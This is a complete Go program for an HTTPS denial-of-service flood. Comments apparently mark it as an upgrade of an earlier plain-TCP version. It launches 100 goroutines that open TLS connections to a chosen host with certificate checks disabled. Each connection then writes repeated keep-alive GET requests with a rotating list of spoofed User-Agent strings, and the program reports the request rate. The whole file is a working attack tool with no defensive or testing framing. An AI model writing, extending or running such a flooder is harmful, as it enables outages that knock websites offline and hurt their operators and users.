package main

import (
	"crypto/tls" // <--- NEW: The library for HTTPS
	"flag"
	"fmt"
	"math/rand"
	"sync"
	"sync/atomic"
	"time"
)

var ops uint64
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/117.0.2045.43",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; U; Android 11; en-US; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F936U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/116.0.5845.96 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"curl/7.88.1",
	"Wget/1.21.3 (linux-gnu)",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Mozilla/5.0 (PlayStation 5 4.00) AppleWebKit/537.73 (KHTML, like Gecko)",
	"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.12.8",
	"DoCoMo/2.0 SH902i(c100;TB;W24H12)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
}

func attack(target string, port int, wg *sync.WaitGroup) {
	defer wg.Done()
	address := fmt.Sprintf("%s:%d", target, port)

	// <--- NEW: TLS Configuration
	// InsecureSkipVerify: true means "Attack even if their SSL cert is broken"
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	for {
		// <--- CHANGE: Use tls.Dial instead of net.Dial
		conn, err := tls.Dial("tcp", address, conf)
		if err != nil {
			// fmt.Printf("Connection failed: %v\n", err) // Uncomment to debug
			continue
		}

		// The rest is the same "Keep-Alive" flood logic
		payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", target, userAgents[rand.Intn(len(userAgents))])

		for {
			_, err := conn.Write([]byte(payload))
			if err != nil {
				conn.Close()
				break
			}
			atomic.AddUint64(&ops, 1)
		}
	}
}

func main() {
	targetPtr := flag.String("t", "example.com", "Target Host (No https://)")
	portPtr := flag.Int("p", 443, "Target Port (Default 443 for HTTPS)")
	threadsPtr := flag.Int("th", 100, "Number of Goroutines")
	flag.Parse()

	fmt.Printf("\n[+] Launching HTTPS Flood on %s:%d\n", *targetPtr, *portPtr)

	var wg sync.WaitGroup
	for i := 0; i < *threadsPtr; i++ {
		wg.Add(1)
		go attack(*targetPtr, *portPtr, &wg)
	}

	start := time.Now()
	go func() {
		for {
			time.Sleep(1 * time.Second)
			currentOps := atomic.LoadUint64(&ops)
			elapsed := time.Since(start).Seconds()
			fmt.Printf("\r[+] HTTPS Requests: %d | RPS: %.0f/s", currentOps, float64(currentOps)/elapsed)
		}
	}()

	wg.Wait()
}